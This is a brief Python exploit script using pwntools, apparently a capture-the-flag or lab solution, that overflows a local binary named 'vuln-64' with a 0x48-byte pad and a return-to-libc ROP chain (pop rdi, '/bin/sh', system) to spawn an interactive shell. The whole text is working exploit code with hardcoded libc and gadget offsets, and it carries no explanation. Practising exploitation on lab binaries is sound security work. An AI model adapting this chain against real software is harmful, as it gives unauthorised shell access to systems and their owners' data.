from pwn import *

libc_base = 0x00007ffff7c00000
system    = libc_base + 0x0004f610
binsh     = libc_base + 0x1c3dcd

pop_rdi   = 0x00000000004011cb

payload = b'x'*0x48 + \
    p64(pop_rdi) + p64(binsh) + \
    p64(system)  + p64(0x0)

p = process('./vuln-64')

p.clean()
p.sendline(payload)
p.interactive()
